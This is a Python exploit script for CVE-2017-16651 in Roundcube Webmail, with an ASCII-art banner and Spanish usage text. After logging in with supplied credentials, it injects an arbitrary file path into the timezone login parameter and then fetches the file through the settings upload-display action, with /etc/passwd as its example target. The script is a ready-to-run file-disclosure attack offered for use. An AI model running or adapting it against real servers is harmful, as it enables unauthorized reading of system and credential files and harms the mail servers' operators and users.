#####################################
#
# Autor: Sephiroth950911
# htttps://github.com/Sephiroth950911
#
#####################################


import sys
import time
import requests
requests.packages.urllib3.disable_warnings()
import argparse

from colorama import init, Fore, Back, Style
init()


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}


print()
print(Fore.YELLOW+"                                              @&")
print("                                           @@@@@")
print("                                         @@@@@@")
print("                                      @@@%.@@@")
print("                                    @@@...@@")
print("                                 @@@,...@@@")
print("                               @@@.....@@%")
print("                            @@@....../@@")
print("                          @@@.......@@@")
print("                       @@@.........@@,")
print("                     @@@..........@@@@@@@@@@@@@@")
print("                  @@@. ....*../,...............@")
print("                 #@@/@@////////@@..............@,")
print("                   @@.///@@////@(............  @@@@@@@@@")
print("                    @@*//@@/@@@@@@@@@@@@@@@@@@@@@@@@@/@@")
print(Style.RESET_ALL + Style.BRIGHT+"                    @@@@@@&/@@@@@@@@@@@@@@@@@@&%%/.(@/@@@@@@@@@")
print("                   @@//////%@@.....................&@@@@@@///@@")
print("                   @@//@@(##.............................@@//@@@@@.")
print("              @@@@@@%//@%................................@@@@@&//@@")
print("              @@///@@(/,.....................................@@@/@@")
print("              @@///@@........................................@@@/@@")
print("              @@///@@........................................@@@/@@")
print("              @@///@@....@@@@@@@@@&...........@@&////%@@.....@@@/@@")
print("              @@//#@@....@@/////@@@...........&@@////&@@.....@@@/@@")
print("              @@//%@@....@@////(///@@@.....@@*///////@@@.....@@@/@@")
print("              @@//@@@....@@@@@@@@@@@@%.....@@@@@@@@@@@@......@@@/@@")
print("              @@//@@#........................................@@@/@@")
print("              @@//@@@@@@@,..............................,@@@@@@@/@@")
print("              @@@@@@@//@@#............@*%@..............,@@//////@@")
print("                    @(/@@@***.........@@@%..........@@%%@@@/@@@@%%")
print("                    @//////#@@.....................&@@//////@@")
print("                    @@@@@@//@@.............@@@&....@@@/@@@@@@@")
print("                        @@//@@...@@@@@....@@@@@@...@@@/@@")
print("                       @@//@@@@@@@@@@@@@@@@@@@@@@@@@@/@@")
print("                       @@//@@@@......@@@@@.....%@@@@//@@")
print(Style.RESET_ALL + Fore.YELLOW+"                        @@@@@@@@................%@&@@@@@@@@@@@@@@@@")
print("                              @@...............................@@@")
print("                              @@@@@@@@@@@@@@@@@@@...........%@@@")
print("                                           @@/@@*.........@@@")
print("                                         ,@@/@@........@@@")
print("                                        *@@/@#......@@@@")
print("                                       @@@@@......@@@")
print("                                      @@@@@....@@@")
print("                                     @@@@/..@@@@")
print("                                    @@@@..@@@")
print("                                   @@@@@@@(")
print("                                  @@@@@@")
print("                                 @@@@")
print("                                 @&")
print(Style.RESET_ALL)
print()
print(Style.BRIGHT + Fore.GREEN+"                CVE-2017-16651 Roundcube Webmail Local File Disclosure")
print()
print()
print(Style.BRIGHT + Fore.MAGENTA)
print("Ejemplo de uso:")
print()
print("Local File Disclosure:                  roundcube.py -t https://webmail.foo.cl -u user -p password -f /etc/passwd")
print("                                        roundcube.py --target https://webmail.foo.cl --user user --password password --file /etc/passwd")
print()

print("Para ver la ayuda use el parametro -h o --help")

time.sleep(60 / 100)

#Definiendo Parametros
print(Fore.RESET)
print(Fore.CYAN)
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Direccion del HOST")
parser.add_argument("-u", "--user", help="Usuario del webmail")
parser.add_argument("-p", "--password", help="Password del usuario")
parser.add_argument("-f", "--file", help="Archivo a mostrar")
args = parser.parse_args()

if args.target:
    target = args.target
if args.user:
    user = args.user
if args.password:
    passw = args.password
if args.file:
    files = args.file

if len(sys.argv) < 2:
    print("[!] Uso: %s -h, --help" % sys.argv[0])
    sys.exit()
else:
    pass

print(Style.RESET_ALL)
print(Style.BRIGHT + Fore.YELLOW)
print("Comprobando Disponibilidad de el servidor en: " + target + "...")
time.sleep(50 / 100)
try:
    remoteweb = requests.get(target, headers=headers)
    if remoteweb.status_code == 200:
        print(Style.RESET_ALL + Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "]" + Fore.GREEN + " El servicio web esta activo")
    else:
        raise Exeption
except ConnectionError:
    print(Style.RESET_ALL + Style.BRIGHT + "[" + Style.RESET_ALL + Fore.RED + "X" + Style.RESET_ALL + Style.BRIGHT + "]"  + Style.RESET_ALL + Fore.RED +  " No se pudo establecer conexion con el servicio web")
    print("    compruebe que el HOST este activo...")
    print()
    sys.exit()
except:
    print(Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE)
    print(Style.RESET_ALL + Style.BRIGHT + "[" + Style.BRIGHT + Fore.BLUE + "?" + Style.RESET_ALL + Style.BRIGHT + "]"  + Style.BRIGHT + Fore.BLUE + " Algo inesperado ha ocurrido")
    print("    compruebe que el HOST este activo...")
    print()
    sys.exit()

time.sleep(50 / 100)
print("[-] Explotando vulnerabilidad...")
time.sleep(50 / 100)
def main():
    session = requests.Session()
    req = session.get(target,params={"_task":"login"},verify=False, headers=headers)
    token = None
    for line in req.text.split("\n"):
        if 'name="_token"' in line:
            token = line.split("value=")[1].split('"')[1]
            print("[+] Token de Sesion: %s" % token)
            time.sleep(50 / 100)
    if token is None:
        print("[!] unable to retrieve token")
        sys.exit(1)

    data = {
        "_token":token,
        "_task":"login",
        "_action":"login",
        "_timezone[files][1][path]":files,
        "_url":"_task%3Dlogin",
        "_user":user,
        "_pass":passw
    }
    req = session.post(target,params={"_task":"login"},data=data,verify=False, headers=headers)

    params = {
        "_task":"settings",
        "_action":"upload-display",
        "_from":"timezone",
        "_file":"rcmfile1"
    }

    req = session.get(target,params=params,verify=False, headers=headers)
    print()
    print("[*] Resultado: ")
    print()
    print(Fore.RESET + Style.NORMAL + Fore.BLUE + req.text)

main()

